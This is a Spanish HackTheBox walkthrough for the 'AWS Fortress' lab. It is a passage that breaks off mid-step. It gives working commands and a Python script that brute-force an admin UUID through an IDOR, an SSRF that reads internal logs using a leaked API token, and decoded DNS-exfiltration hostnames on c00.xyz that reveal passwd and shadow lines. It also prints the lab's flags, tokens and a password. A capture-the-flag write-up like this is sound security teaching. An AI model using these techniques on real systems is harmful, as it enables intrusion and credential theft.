---
hidden: true
icon: aws
---

# AWS Fortress HackTheBox

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-25 12:47 CET
Nmap scan report for 10.13.37.15
Host is up (0.040s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Apache httpd 2.4.52 ((Win64))
| http-methods:
|_  Potentially risky methods: TRACE
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.52 (Win64)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-12-25 11:48:16Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: amzcorp.local0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
2179/tcp  open  vmrdp?
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: amzcorp.local0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49675/tcp open  msrpc         Microsoft Windows RPC
49684/tcp open  msrpc         Microsoft Windows RPC
49687/tcp open  msrpc         Microsoft Windows RPC
49705/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2025-12-25T11:49:12
|_  start_date: N/A
|_clock-skew: 12s
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 78.11 seconds
```

Veremos que hay varios puertos abiertos, entre ellos nos llama la atencion el puerto `80`, `WinRM`, `Kerberos`, entre otros, si accedemos al `80` directamente desde la `IP`, veremos que nos esta intentando realizar una resolucion `DNS` al dominio `jobs.amzcorp.local`, por lo que vamos añadirlo a nuestro archivo `hosts`.

```shell
nano /etc/hosts

#Dentro del nano
<IP>           jobs.amzcorp.local
```

Lo guardamos y si probamos a entrar de nuevo...

```
URL = http://jobs.amzcorp.local/
```

Info:

<figure><img src="../../.gitbook/assets/Pasted image 20251225125457.png" alt=""><figcaption></figcaption></figure>

## Early Access

Veremos un `login` aparentemente normal, pero podremos registrar una cuenta, una vez que hayamos creado una cuenta en `AWS`, vamos a iniciar sesion con la misma, hecho esto veremos lo siguiente:

<figure><img src="../../.gitbook/assets/Pasted image 20251225125807.png" alt=""><figcaption></figcaption></figure>

Vemos una `dashboard` normal, pero si inspeccionamos el codigo veremos la siguiente linea:

```html
<script src="/static/assets/js/app.js"></script>
```

Hay un `script` bastante interesante en el que si entramos veremos lo siguiente:

<figure><img src="../../.gitbook/assets/Pasted image 20251225140620.png" alt=""><figcaption></figcaption></figure>

Vemos que es el unico codigo que esta ofuscado lo cual llama bastante la atencion, vamos a utilizar una pagina llamada `de4js`.

URL = [Pagina de4js](https://thanhle.io.vn/de4js/)

Si seleccionamos el formato de cifrado llamado `JJencode` veremos que nos lo decodifica bien (Esto lo hice probando las diversas opciones que habia en la pagina hasta que me funciono con esa), decodificado se veria asi:

```js
"use strict";
const d = document;
d.addEventListener("DOMContentLoaded", function (event) {

    const swalWithBootstrapButtons = Swal.mixin({
        customClass: {
            confirmButton: 'btn btn-primary me-3',
            cancelButton: 'btn btn-gray'
        },
        buttonsStyling: false
    });

    var themeSettingsEl = document.getElementById('theme-settings');
    var themeSettingsExpandEl = document.getElementById('theme-settings-expand');

    if (themeSettingsEl) {

        var themeSettingsCollapse = new bootstrap.Collapse(themeSettingsEl, {
            show: true,
            toggle: false
        });

        if (window.localStorage.getItem('settings_expanded') === 'true') {
            themeSettingsCollapse.show();
            themeSettingsExpandEl.classList.remove('show');
        } else {
            themeSettingsCollapse.hide();
            themeSettingsExpandEl.classList.add('show');
        }

        themeSettingsEl.addEventListener('hidden.bs.collapse', function () {
            themeSettingsExpandEl.classList.add('show');
            window.localStorage.setItem('settings_expanded', false);
        });

        themeSettingsExpandEl.addEventListener('click', function () {
            themeSettingsExpandEl.classList.remove('show');
            window.localStorage.setItem('settings_expanded', true);
            setTimeout(function () {
                themeSettingsCollapse.show();
            }, 300);
        });
    }

    // options
    const breakpoints = {
        sm: 540,
        md: 720,
        lg: 960,
        xl: 1140
    };

    var sidebar = document.getElementById('sidebarMenu')
    if (sidebar && d.body.clientWidth < breakpoints.lg) {
        sidebar.addEventListener('shown.bs.collapse', function () {
            document.querySelector('body').style.position = 'fixed';
        });
        sidebar.addEventListener('hidden.bs.collapse', function () {
            document.querySelector('body').style.position = 'relative';
        });
    }

    var iconNotifications = d.querySelector('.notification-bell');
    if (iconNotifications) {
        iconNotifications.addEventListener('shown.bs.dropdown', function () {
            iconNotifications.classList.remove('unread');
        });
    }

    [].slice.call(d.querySelectorAll('[data-background]')).map(function (el) {
        el.style.background = 'url(' + el.getAttribute('data-background') + ')';
    });

    [].slice.call(d.querySelectorAll('[data-background-lg]')).map(function (el) {
        if (document.body.clientWidth > breakpoints.lg) {
            el.style.background = 'url(' + el.getAttribute('data-background-lg') + ')';
        }
    });

    [].slice.call(d.querySelectorAll('[data-background-color]')).map(function (el) {
        el.style.background = 'url(' + el.getAttribute('data-background-color') + ')';
    });

    [].slice.call(d.querySelectorAll('[data-color]')).map(function (el) {
        el.style.color = 'url(' + el.getAttribute('data-color') + ')';
    });

    //Tooltips
    var tooltipTriggerList = [].slice.call(document.querySelectorAll('[data-bs-toggle="tooltip"]'))
    var tooltipList = tooltipTriggerList.map(function (tooltipTriggerEl) {
        return new bootstrap.Tooltip(tooltipTriggerEl)
    })


    // Popovers
    var popoverTriggerList = [].slice.call(document.querySelectorAll('[data-bs-toggle="popover"]'))
    var popoverList = popoverTriggerList.map(function (popoverTriggerEl) {
        return new bootstrap.Popover(popoverTriggerEl)
    })


    // Datepicker
    var datepickers = [].slice.call(d.querySelectorAll('[data-datepicker]'))
    var datepickersList = datepickers.map(function (el) {
        return new Datepicker(el, {
            buttonClass: 'btn'
        });
    })

    if (d.querySelector('.input-slider-container')) {
        [].slice.call(d.querySelectorAll('.input-slider-container')).map(function (el) {
            var slider = el.querySelector(':scope .input-slider');
            var sliderId = slider.getAttribute('id');
            var minValue = slider.getAttribute('data-range-value-min');
            var maxValue = slider.getAttribute('data-range-value-max');

            var sliderValue = el.querySelector(':scope .range-slider-value');
            var sliderValueId = sliderValue.getAttribute('id');
            var startValue = sliderValue.getAttribute('data-range-value-low');

            var c = d.getElementById(sliderId),
                id = d.getElementById(sliderValueId);

            noUiSlider.create(c, {
                start: [parseInt(startValue)],
                connect: [true, false],
                //step: 1000,
                range: {
                    'min': [parseInt(minValue)],
                    'max': [parseInt(maxValue)]
                }
            });
        });
    }

    if (d.getElementById('input-slider-range')) {
        var c = d.getElementById("input-slider-range"),
            low = d.getElementById("input-slider-range-value-low"),
            e = d.getElementById("input-slider-range-value-high"),
            f = [d, e];

        noUiSlider.create(c, {
            start: [parseInt(low.getAttribute('data-range-value-low')), parseInt(e.getAttribute('data-range-value-high'))],
            connect: !0,
            tooltips: true,
            range: {
                min: parseInt(c.getAttribute('data-range-value-min')),
                max: parseInt(c.getAttribute('data-range-value-max'))
            }
        }), c.noUiSlider.on("update", function (a, b) {
            f[b].textContent = a[b]
        });
    }

    //Chartist

    if (d.querySelector('.ct-chart-sales-value')) {
        //Chart 5
        new Chartist.Line('.ct-chart-sales-value', {
            labels: ['Mon', 'Tue', 'Wed', 'Thu', 'Fri', 'Sat', 'Sun'],
            series: [
                [0, 10, 30, 40, 80, 60, 100]
            ]
        }, {
            low: 0,
            showArea: true,
            fullWidth: true,
            plugins: [
                Chartist.plugins.tooltip()
            ],
            axisX: {
                // On the x-axis start means top and end means bottom
                position: 'end',
                showGrid: true
            },
            axisY: {
                // On the y-axis start means left and end means right
                showGrid: false,
                showLabel: false,
                labelInterpolationFnc: function (value) {
                    return '$' + (value / 1) + 'k';
                }
            }
        });
    }

    if (d.querySelector('.ct-chart-ranking')) {
        var chart = new Chartist.Bar('.ct-chart-ranking', {
            labels: ['Mon', 'Tue', 'Wed', 'Thu', 'Fri', 'Sat'],
            series: [
                [1, 5, 2, 5, 4, 3],
                [2, 3, 4, 8, 1, 2],
            ]
        }, {
            low: 0,
            showArea: true,
            plugins: [
                Chartist.plugins.tooltip()
            ],
            axisX: {
                // On the x-axis start means top and end means bottom
                position: 'end'
            },
            axisY: {
                // On the y-axis start means left and end means right
                showGrid: false,
                showLabel: false,
                offset: 0
            }
        });

        chart.on('draw', function (data) {
            if (data.type === 'line' || data.type === 'area') {
                data.element.animate({
                    d: {
                        begin: 2000 * data.index,
                        dur: 2000,
                        from: data.path.clone().scale(1, 0).translate(0, data.chartRect.height()).stringify(),
                        to: data.path.clone().stringify(),
                        easing: Chartist.Svg.Easing.easeOutQuint
                    }
                });
            }
        });
    }

    if (d.querySelector('.ct-chart-traffic-share')) {
        var data = {
            series: [70, 20, 10]
        };

        var sum = function (a, b) {
            return a + b
        };

        new Chartist.Pie('.ct-chart-traffic-share', data, {
            labelInterpolationFnc: function (value) {
                return Math.round(value / data.series.reduce(sum) * 100) + '%';
            },
            low: 0,
            high: 8,
            donut: true,
            donutWidth: 20,
            donutSolid: true,
            fullWidth: false,
            showLabel: false,
            plugins: [
                Chartist.plugins.tooltip()
            ],
        });
    }

    if (d.getElementById('loadOnClick')) {
        d.getElementById('loadOnClick').addEventListener('click', function () {
            var button = this;
            var loadContent = d.getElementById('extraContent');
            var allLoaded = d.getElementById('allLoadedText');

            button.classList.add('btn-loading');
            button.setAttribute('disabled', 'true');

            setTimeout(function () {
                loadContent.style.display = 'block';
                button.style.display = 'none';
                allLoaded.style.display = 'block';
            }, 1500);
        });
    }

    var scroll = new SmoothScroll('a[href*="#"]', {
        speed: 500,
        speedAsDuration: true
    });

    if (d.querySelector('.current-year')) {
        d.querySelector('.current-year').textContent = new Date().getFullYear();
    }

    // Glide JS

    if (d.querySelector('.glide')) {
        new Glide('.glide', {
            type: 'carousel',
            startAt: 0,
            perView: 3
        }).mount();
    }

    if (d.querySelector('.glide-testimonials')) {
        new Glide('.glide-testimonials', {
            type: 'carousel',
            startAt: 0,
            perView: 1,
            autoplay: 2000
        }).mount();
    }

    if (d.querySelector('.glide-clients')) {
        new Glide('.glide-clients', {
            type: 'carousel',
            startAt: 0,
            perView: 5,
            autoplay: 2000
        }).mount();
    }

    if (d.querySelector('.glide-news-widget')) {
        new Glide('.glide-news-widget', {
            type: 'carousel',
            startAt: 0,
            perView: 1,
            autoplay: 2000
        }).mount();
    }

    if (d.querySelector('.glide-autoplay')) {
        new Glide('.glide-autoplay', {
            type: 'carousel',
            startAt: 0,
            perView: 3,
            autoplay: 2000
        }).mount();
    }

    // Pricing countup
    var billingSwitchEl = d.getElementById('billingSwitch');
    if (billingSwitchEl) {
        const countUpStandard = new countUp.CountUp('priceStandard', 99, {
            startVal: 199
        });
        const countUpPremium = new countUp.CountUp('pricePremium', 199, {
            startVal: 299
        });

        billingSwitchEl.addEventListener('change', function () {
            if (billingSwitch.checked) {
                countUpStandard.start();
                countUpPremium.start();
            } else {
                countUpStandard.reset();
                countUpPremium.reset();
            }
        });
    }

});

SetDatePicker();

$(document).ready(function () {
    // Delete Item
    $('.item-row').on('click', '.delete_item', function (event) {
        event.preventDefault();
        var btn = $(this);
        var url = btn.data('href');
        var param = [];
        param['url'] = url;
        param['btn'] = btn;

        $.confirm({
            title: 'Warning!',
            content: 'Are you sure you want to delete?',
            type: 'red',
            buttons: {
                yes: function () {
                    AjaxRemoveItem(param);
                },
                no: function () {}
            }
        }, );
    });

    // Edit Item by double click
    $('.item-row').dblclick(function (event) {
        event.preventDefault();
        var item = $(this);
        var url = item.data('edit');
        var param = [];
        param['url'] = url;
        param['item'] = item;
        AjaxGetEditRowForm(param);
    });

    // Save form with click button
    $('.item-row').on('click', '.save_form', function (event) {
        event.preventDefault();
        var btn = $(this);
        SaveItem(btn);
    });

    // Save form with ENTER
    $('.item-row').keyup('.value', function (event) {
        if (event.keyCode === 13) {
            event.preventDefault();
            var btn = $(this);
            SaveItem(btn);
        }
    });
    $('.item-row').keyup('.name', function (event) {
        if (event.keyCode === 13) {
            event.preventDefault();
            var btn = $(this);
            SaveItem(btn);
        }
    });

    // Cancel edit form
    $('.item-row').on('click', '.cancel_form', function (event) {
        event.preventDefault();
        var btn = $(this);
        var item = btn.closest('.item-row');
        var url = item.data('detail');
        var param = [];
        param['url'] = url;
        param['item'] = item;
        AjaxGetEditRowDetail(param);
    });
});


// Functions

function AjaxGetEditRowDetail(param) {
    $.ajax({
        url: param['url'],
        type: 'GET',
        success: function (data) {
            param['item'].html(data);
        },
        error: function () {
            notification.error('Error occurred');
        }
    });
}

function AjaxGetEditRowForm(param) {
    $.ajax({
        url: param['url'],
        type: 'GET',
        success: function (data) {
            param['item'].html(data);
            SetDatePicker();
        },
        error: function () {
            notification.error('Error occurred');
        }
    });
}

function AjaxPutEditRowForm(param) {
    $.ajax({
        url: param['url'],
        type: 'PUT',
        data: param['query'],
        beforeSend: function (xhr) {
            xhr.setRequestHeader("X-CSRFToken", $.cookie('csrftoken'));
        },
        success: function (data) {
            notification[data.valid](data.message);

            if (data.valid === 'success') {
                param['item'].html(data.edit_row);
                SetDatePicker();
            }
        },
        error: function () {
            toastr.error('Error occurred');
        }
    });
}

function AjaxRemoveItem(param) {
    $.ajax({
        url: param['url'],
        type: 'DELETE',
        data: param['query'],
        beforeSend: function (xhr) {
            xhr.setRequestHeader("X-CSRFToken", $.cookie('csrftoken'));
        },
        success: function (data) {
            if (data.valid !== 'success')
                notification[data.valid](data.message);

            if (data.valid === 'success') {
                if (data.redirect_url) {
                    window.location.replace(data.redirect_url);
                } else {
                    notification[data.valid](data.message);
                    var item_row = param['btn'].closest('.item-row');
                    item_row.hide('slow', function () {
                        item_row.remove();
                    });
                }
            }
        },
        error: function () {
            toastr.error('Error occurred');
        }
    });
}

function SaveItem(btn) {
    var item = btn.closest('.item-row');
    var url = item.data('edit');
    var param = [];
    param['url'] = url;
    param['item'] = item;
    param['query'] = $('.value').serialize() + '&' + $('.name').serialize() + '&' + $('.type').serialize();
    AjaxPutEditRowForm(param);
}

function SetDatePicker() {
    var datepickers = [].slice.call(d.querySelectorAll('.datepicker_input'));
    datepickers.map(function (el) {
        return new Datepicker(el, {
            format: 'yyyy-mm-dd'
        });
    });
}

function GenerateToken() {
    var generate_token = document.getElementById('generate_token');
    var api_token = document.getElementById('api_token');
    var output = document.getElementById('output');
    output.innerHTML = '';
    if (username.value == "") {
        output.innerHTML = "Username value cannot be empty!";
        setTimeout(() => {
            document.getElementById('closeAlert');
        }, 2000);
        return;
    }
    xhr.open('POST', '/api/v4/tokens/generate_token');
    xhr.responseType = 'json';
    xhr.onload = function (e) {
        if (this.status == 200) {
            api_token.append(this.response['token']);
        }
    };
    data = {
        "generate_token": generate_token
    }
    xhr.send(data);
}

function GetToken() {
    var uuid = document.getElementById('uuid');
    var username = document.getElementById('username');
    var api_token = document.getElementById('api_token');
    var output = document.getElementById('output');
    output.innerHTML = '';
    if (username.value == "") {
        output.innerHTML = "Username value cannot be empty!";
        setTimeout(() => {
            document.getElementById('closeAlert');
        }, 2000);
        return;
    }
    xhr.open('POST', '/api/v4/tokens/get');
    xhr.responseType = 'json';
    xhr.onload = function (e) {
        if (this.status == 200) {
            api_token.append(this.response['token']);
        }
    };
    data = btoa('{"get_token": "True", "uuid":' + uuid ',"username":' + username + '}');
    xhr.send({
        "data": data
    });
}

function GetLogData() {
    var log_table = document.getElementById('log_table');
    const xhr = new XMLHttpRequest();

    xhr.open('GET', '/api/v4/logs/get_logs');
    xhr.responseType = 'json';
    xhr.onload = function (e) {
        if (this.status == 200) {
            log_table.append(this.response['log']);
        }
    };
    xhr.send();
}

function GenerateToken() {
    var generate_token = document.getElementById('generate_token');
    var api_token = document.getElementById('api_token');
    var output = document.getElementById('output');
    output.innerHTML = '';
    if (username.value == "") {
        output.innerHTML = "Username value cannot be empty!";
        setTimeout(() => {
            document.getElementById('closeAlert');
        }, 2000);
        return;
    }
    xhr.open('POST', '/api/v4/tokens/generate');
    xhr.responseType = 'json';
    xhr.onload = function (e) {
        if (this.status == 200) {
            api_token.append(this.response['token']);
        }
    };
    data = {
        "generate_token": generate_token
    }
    xhr.send(data);
}

function GetToken() {
    var uuid = document.getElementById('uuid');
    var username = document.getElementById('username');
    var api_token = document.getElementById('api_token');
    var output = document.getElementById('output');
    output.innerHTML = '';
    if (username.value == "") {
        output.innerHTML = "Username value cannot be empty!";
        setTimeout(() => {
            document.getElementById('closeAlert');
        }, 2000);
        return;
    }
    xhr.open('POST', '/api/v4/tokens/get');
    xhr.responseType = 'json';
    xhr.onload = function (e) {
        if (this.status == 200) {
            api_token.append(this.response['token']);
        }
    };
    data = btoa('{"get_token": "True", "uuid":' + uuid ',"username":' + username + '}');
    xhr.send({
        "data": data
    });
}

function GetLogData() {
    var log_table = document.getElementById('log_table');
    const xhr = new XMLHttpRequest();

    xhr.open('GET', '/api/v4/logs/get');
    xhr.responseType = 'json';
    xhr.onload = function (e) {
        if (this.status == 200) {
            log_table.append(this.response['log']);
        } else {
            log_table.append("Error retrieving logs from logs.amzcorp.local");
        }
    };
    xhr.send();
}
```

Investigando un poco el codigo veremos una funcion bastante interesante llamada `GetToken()` y `GenerateToken()`, pero sobre todo el `GetToken()`:

```js
// FUNCION GENERAR TOKEN

function GenerateToken() {
    var generate_token = document.getElementById('generate_token');
    var api_token = document.getElementById('api_token');
    var output = document.getElementById('output');
    output.innerHTML = '';
    if (username.value == "") {
        output.innerHTML = "Username value cannot be empty!";
        setTimeout(() => {
            document.getElementById('closeAlert');
        }, 2000);
        return;
    }
    xhr.open('POST', '/api/v4/tokens/generate_token');
    xhr.responseType = 'json';
    xhr.onload = function (e) {
        if (this.status == 200) {
            api_token.append(this.response['token']);
        }
    };
    data = {
        "generate_token": generate_token
    }
    xhr.send(data);
}

// FUNCION OBTENER TOKEN

function GetToken() {
    var uuid = document.getElementById('uuid');
    var username = document.getElementById('username');
    var api_token = document.getElementById('api_token');
    var output = document.getElementById('output');
    output.innerHTML = '';
    if (username.value == "") {
        output.innerHTML = "Username value cannot be empty!";
        setTimeout(() => {
            document.getElementById('closeAlert');
        }, 2000);
        return;
    }
    xhr.open('POST', '/api/v4/tokens/get');
    xhr.responseType = 'json';
    xhr.onload = function (e) {
        if (this.status == 200) {
            api_token.append(this.response['token']);
        }
    };
    data = btoa('{"get_token": "True", "uuid":' + uuid ',"username":' + username + '}');
    xhr.send({
        "data": data
    });
}
```

Vemos bastante interesante el `GetToken()` ya que esta envia en `Base64` una estructura `JSON` pasandole `username` y `uuid` que son parametros ingresados por el usuario cliente.

**Problemas críticos:**

1. **Concatenación directa sin sanitización** → **Inyección JSON**
2. **`btoa()` sobre string concatenado** → Podemos manipular la estructura
3. **`uuid` y `username` son valores de input del usuario**

Lo que se nos ocurre en este punto es intentar obtener el `TOKEN` del usuario `admin`, pero no sabemos su `uuid` para poder hacerlo, por lo que vamos a crear un script en `python3` que haga fuerza bruta a dicha `API` hasta saber el `uuid` del usuario `admin`.

### Bruteforce "uuid" (admin)

Vamos a probar que nos da si enviamos uno de forma erronea para montar nuestro script de forma correcta.

```shell
echo '{"get_token": "True", "uuid": "1", "username": "admin"}' | base64
```

Info:

```
eyJnZXRfdG9rZW4iOiAiVHJ1ZSIsICJ1dWlkIjogIjEiLCAidXNlcm5hbWUiOiAiYWRtaW4ifQ==
```

Ahora esto que esta codificado en `Base64` se lo pasamos como `Data` ya que es como observamos en la funcion.

```shell
curl -s -X POST "http://jobs.amzcorp.local/api/v4/tokens/get" -H "Content-Type: application/json" -H "Cookie: session=<TOKEN_SESSION>" -d '{"data":"eyJnZXRfdG9rZW4iOiAiVHJ1ZSIsICJ1dWlkIjogIjEiLCAidXNlcm5hbWUiOiAiYWRtaW4ifQ=="}'
```

Info:

```
{
  "error": "Invalid UUID"
}
```

Sabiendo esto vamos a crear el siguiente script:

> bruteUUID.py

```python
#!/usr/bin/python3
import requests, base64, sys
from pwn import log

bar = log.progress("uuid")

target = "http://jobs.amzcorp.local/api/v4/tokens/get"

cookies = {"session": "<TOKEN_SESSION>"}  
headers = {"Content-Type": "application/json"}

for uuid in range(0, 1000):
    # 1. Crear el JSON como string
    data = '{"get_token": "True", "uuid": "%d", "username": "admin"}' % uuid
    
    # 2. Codificar en base64 (esto devuelve BYTES)
    # 3. Convertir bytes a string con .decode()
    encoded_data = base64.b64encode(data.encode()).decode()
    
    # 4. Crear el JSON final
    json_payload = {"data": encoded_data}
    
    # 5. Enviar la peticiÃ³n
    request = requests.post(target, headers=headers, cookies=cookies, json=json_payload)
    bar.status(str(uuid))
    
    # 6. Verificar respuesta
    if "Invalid" not in request.text:
        print(request.text.strip())
        bar.success(str(uuid))
        sys.exit(0)
```

Ahora vamos a ejecutarlo de esta forma:

```shell
python3 bruteUUID.py
```

Info:

```
[+] uuid: 955
{
  "flag": "AWS{S1mPl3_iD0R_4_4dm1N}",
  "token": "98d7f87065c5242ef5d3f6973720293ec58e434281e8195bef26354a6f0e931a1fd50a72ebfc8ead820cb38daca218d771d381259fd5d1a050b6620d1066022a",
  "username": "admin",
  "uuid": "955"
}
```

Despues de un rato veremos que ha funcionado el `admin` es el `uuid` numero `955` y con ello nos muestra toda la informacion incuyendo la primera `flag`.

> Early Access (Flag)

```
AWS{S1mPl3_iD0R_4_4dm1N}
```

## Inspector

Con ese `TOKEN` que obtuvimos no podemos intercambiarlo por la sesion que tenemos actualmente ya que no funciona de esa forma, por lo que tendremos que ver otra forma en la que poder utilizarlo.

Si observamos el estado de los subdominios veremos varios interesantes.

```shell
curl -s "http://jobs.amzcorp.local/api/v4/status" | jq
```

Info:

```json
{
  "site_status": [
    {
      "site": "amzcorp.local",
      "status": "OK"
    },
    {
      "site": "jobs.amzcorp.local",
      "status": "OK"
    },
    {
      "site": "services.amzcorp.local",
      "status": "OK"
    },
    {
      "site": "cloud.amzcorp.local",
      "status": "OK"
    },
    {
      "site": "inventory.amzcorp.local",
      "status": "OK"
    },
    {
      "site": "workflow.amzcorp.local",
      "status": "OK"
    },
    {
      "site": "company-support.amzcorp.local",
      "status": "OK"
    }
  ]
}
```

Nos revela varios subdominios los cuales vamos añadir en nuestro archivo `hosts`.

```shell
nano /etc/hosts

#Dentro del nano
<IP>             jobs.amzcorp.local amzcorp.local services.amzcorp.local cloud.amzcorp.local inventory.amzcorp.local workflow.amzcorp.local company-support.amzcorp.local
```

Lo guardamos y si probamos a ir a cada una de ellas, veremos lo siguiente:

> cloud.amzcorp.local

<figure><img src="../../.gitbook/assets/Pasted image 20251226113301.png" alt=""><figcaption></figcaption></figure>

> inventory.amzcorp.local

<figure><img src="../../.gitbook/assets/Pasted image 20251226113311.png" alt=""><figcaption></figcaption></figure>

> workflow.amzcorp.local

<figure><img src="../../.gitbook/assets/Pasted image 20251226113322.png" alt=""><figcaption></figcaption></figure>

Esas paginas de momento las dejaremos un poco de lado, si seguimos investigando veremos otra `API` del codigo que vimos anteriormente bastante interesante para obtener los `logs`.

```shell
curl "http://jobs.amzcorp.local/api/v4/logs/get" -H "Cookie: session=<TOKEN_SESSION>"
```

Info:

```
{
  "error": "Unauthorized Access!"
}
```

Veremos que no nos permite visualizarlos, pero recordemos que con el `status` podiamos ver los `subdominios`, podemos usar la ruta `status` para apuntar a `logs.amzcorp.local` y mediante un `SSRF` acceder a este subdominio, para ello necesitaremos el `token` de admin que obtuvimos.

### SSRF mediante API "status"

Despues de un rato haciendo pruebas, vemos lo siguiente:

```shell
curl -X POST "http://jobs.amzcorp.local/api/v4/status" \
  -H "Content-Type: application/json" \
  -d '{"url":"http://logs.amzcorp.local"}' | jq
```

Info:

```
% Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100    87  100    52  100    35    605    407 --:--:-- --:--:-- --:--:--  1023
{
  "error": "API Token not specified in cookies"
}
```

Vemos que con esa construccion de peticion nos pone que requiere de un `TOKEN`, por lo que vamos a utilizar el de `admin` de esta forma:

```shell
curl -X POST "http://jobs.amzcorp.local/api/v4/status" \
  -H "Content-Type: application/json" \
  -H "Cookie: api_token=98d7f87065c5242ef5d3f6973720293ec58e434281e8195bef26354a6f0e931a1fd50a72ebfc8ead820cb38daca218d771d381259fd5d1a050b6620d1066022a" \
  -d '{"url":"http://logs.amzcorp.local"}'
```

Visualizaremos excesiba informacion, esto quiere decir que esta funcionando, pero es inviable visualizar tanta informacion de esta forma, por lo que vamos a filtrarla:

```shell
curl -X POST "http://jobs.amzcorp.local/api/v4/status" \
  -H "Content-Type: application/json" \
  -H "Cookie: api_token=98d7f87065c5242ef5d3f6973720293ec58e434281e8195bef26354a6f0e931a1fd50a72ebfc8ead820cb38daca218d771d381259fd5d1a050b6620d1066022a" \
  -d '{"url":"http://logs.amzcorp.local"}' | sed 's/\\n/\n/g' | sed 's/\\//g' | sed 's/""//g' > info.txt
```

Hecho esto si leemos dicho archivo veremos tambien mucha informacion, pero en este caso mas filtrada y de mejor forma.

Despues de una larga investigacion linea por linea, vemos un patron que sigue un `hostname` codificado en `Base64` seguido de `.c00.xyz`, si decodificamos ese `Base64`...

```
.............................<RESTO DE INFO>.......................................
{
    "hostname": "IyBVbmxpa2UgYW55IG90aGVyIGNyb250YWIgeW91IGRvbid0IGhhdmUgdG8gcnVuIHRoZSBgY3JvbnRhYicK.c00.xyz", 
    "ip_address": "129.141.123.251", 
    "method": "GET", 
    "requester_ip": "172.22.11.10", 
    "url": "/"
  }, 
{
    "hostname": "bHA6eDo3Ojc6bHA6L3Zhci9zcG9vbC9scGQ6L3Vzci9zYmluL25vbG9naW4K.c00.xyz", 
    "ip_address": "129.141.123.251", 
    "method": "GET", 
    "requester_ip": "172.22.11.10", 
    "url": "/"
  },  
  {
    "hostname": "bGlzdDoqOjE4OTA2OjA6OTk5OTk6Nzo6Ogo.c00.xyz", 
    "ip_address": "129.141.123.251", 
    "method": "GET", 
    "requester_ip": "172.22.11.10", 
    "url": "/"
  },
  {
    "hostname": "company-support.amzcorp.local", 
    "ip_address": "172.22.11.10", 
    "method": "GET", 
    "requester_ip": "5.105.94.168", 
    "url": "/static/assets/img/brand/aws-logo.jpg"
  }, 
  {
    "hostname": "company-support.amzcorp.local", 
    "ip_address": "172.22.11.10", 
    "method": "GET", 
    "requester_ip": "248.180.115.169", 
    "url": "/static/assets/vendor/@popperjs/core/dist/umd/popper.min.js"
  }, 
.............................<RESTO DE INFO>.......................................
```

```shell
echo 'IyBVbmxpa2UgYW55IG90aGVyIGNyb250YWIgeW91IGRvbid0IGhhdmUgdG8gcnVuIHRoZSBgY3JvbnRhYicK' | base64 -d
echo 'bHA6eDo3Ojc6bHA6L3Zhci9zcG9vbC9scGQ6L3Vzci9zYmluL25vbG9naW4K' | base64 -d
echo 'bGlzdDoqOjE4OTA2OjA6OTk5OTk6Nzo6Ogo' | base64 -d
```

Info:

```
# Unlike any other crontab you don't have to run the `crontab'
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
list:*:18906:0:99999:7:::
```

Veremos que estan ejecutando comandos de forma remota de forma bastante inteligente, lo que estan haciendo es actuar como servidor atacante el `.c00.xyz` y el subdominio de ese `dominio atacante` que les devuelva el propio servidor el output de los comandos ejecutados por el atacante en `Base64` en formato dominio desde el `hostname`, pudiendo exfiltrar informacion del servidor.

Vemos que el dominio vulnerable es `company-support.amzcorp.local` y su `IP` interna es `172.22.11.10`, vamos a probar a decodificar todos los `Base64` que hemos obtenido aplicando el siguiente filtro.

```shell
grep -o '"[^"]*\.c00\.xyz"' info.txt | sed 's/"//g' | while read host; do
    echo "$host" | sed 's/\.c00\.xyz$//' | base64 -d 2>/dev/null
done | grep -v "^$" > decode.txt
```

Con esto tendremos todo decodificado en un archivo llamado `decode.txt`, despues de un rato investigandolo si probamos a filtrar por `AWS` veremos lo siguiente:

```shell
cat decode.txt | grep "AWS"
```

Info:

```
AWS{F1nD1nG_4_N33dl3_1n_h4y5t4ck}
```

Hemos obtenido la siguiente `Flag`.

> Inspector (Flag)

```
AWS{F1nD1nG_4_N33dl3_1n_h4y5t4ck}
```

## Statement

Si seguimos filtrando otras cosas (Como contraseñas) del archivo `info.txt` veremos informacion interesante, ya que del dumpeo de la informacion decodificada no nos mostraba nada interesante.

```shell
cat info.txt | grep "password.*"
```

Info:

```
"url": "/forgot-passsword/step_two/?username=tyler&email=tyler@amzcorp.local&password=%7BpXDWXyZ%26%3E3h%27%27W%3C"
```

Vemos esta linea muy interesante, por lo que parece se muestra una contraseña codificada en `URL`, si la decodificamos veremos lo siguiente:

```shell
